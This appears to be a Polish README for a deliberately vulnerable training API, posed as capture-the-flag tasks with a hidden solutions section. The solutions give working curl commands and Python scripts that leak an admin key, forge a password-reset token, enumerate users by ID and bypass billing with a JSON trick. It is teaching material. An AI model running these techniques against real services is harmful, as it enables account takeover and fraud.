# bawim
## Analiza oraz wykorzystanie podatności w zapytaniach HTTP pomiędzy aplikacją mobilną i API
Instalacja nie jest wymagana, API znajduje się pod adresem https://bawim.tk.  
Do wysyłania zapytań najlepiej użyć narzędzia curl lub serwisu https://postman.co.

## Zadania
[przykładowe] 0. Znajdź wersję aplikacji.  
curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/get_app_version

1. Znajdź ID konta 'admin', a następnie klucz przypisany do konta.
2. Przy użyciu znalezionego klucza wypisz szczegółowe informacje o koncie 'admin'.
3. Zresetuj hasło admina, znając kod funkcji weryfikującej token.  
![alt text](https://github.com/matih123/bawim/blob/master/verify.png)  
4. Zaloguj się na konto admina (podaj id sesji).  
5. Znajdź użytkownika, który ma na koncie $1.000.000.  
podpowiedź: napisz prosty skrypt np. w pythonie (moduł requests).  
![alt text](https://github.com/matih123/bawim/blob/master/requests.png)  
6. Ustaw typ konta na premium dowolnemu użytkownikowi.  
podpowiedź: https://youtu.be/MpeaSNERwQA.

## Lista endpointów API

Wszystkie endpointy działają w oparciu o metodę POST oraz wymagają uwierzytelnienia kluczem globalnym (-d key=Re2LPGUMEKa34ik1uhHOBMoc). 

* https://bawim.tk/get_app_version  
parametry: key   
* https://bawim.tk/user/{user_id}  
parametry: key  
* https://bawim.tk/user_data/{user_id}  
parametry: key, user_key  
* https://bawim.tk/login/{username}  
parametry: key, password  
* https://bawim.tk/reset_password/{user_id}  
parametry: key  
* https://bawim.tk/set_password/{user_id}/{token}  
parametry: key, new_password  
* https://bawim.tk/set_premium_account/{user_id}  
parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w formacie json (-d json={json_string})  

## Rozwiązania
<details>
  <summary>Pokaż</summary>
  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/login/admin  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/user/386  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d user_key=AnbgzkuaayRdT4HIab8lV513 https://bawim.tk/user_data/386  
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc https://bawim.tk/reset_password/386  
  
  ```python
  # Funkcja generujaca token yKW@n3UoT5n@xU5n@xUu.s
  def generate():
    plaintext = ('386' + 'admin' + 'admin@bawim.tk')[::-1]
    token = ''
    alphabet = string.ascii_letters + string.digits + '@.'
    sbox = '2k8PseIuF.YTWUovx6BqbnOyQ@5dtERZKMc3iwg7jLN40lzpJmrHAShVaf1XCG9D'

    for char in plaintext:
        token += sbox[(alphabet.index(char) + 13) % len(alphabet)]

    return token
  ```
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d new_password=<wpisz_nowe_hasło_admina> https://bawim.tk/set_password/386/yKW@n3UoT5n@xU5n@xUu.s
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d password=<wpisz_nowe_hasło_admina> https://bawim.tk/login/admin
  
  ```python
   # Znajdywanie użytkownika, który ma na koncie $1.000.000
  import requests, json

  i=0
  while True:
      text = requests.post(f'https://bawim.tk/user/{i}', data={"key": "Re2LPGUMEKa34ik1uhHOBMoc"}).text
      json_data = json.loads(text)
      user_key = json_data['user_key']

      text = requests.post(f'https://bawim.tk/user_data/{i}', data={"key": "Re2LPGUMEKa34ik1uhHOBMoc", "user_key": user_key}).text
      json_data = json.loads(text)
      money = json_data['money_amount']
      username = json_data['username']
      print(username, money)

      if(money == "1000000"): break
      i+=1
 
```
  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200  
  
</details>
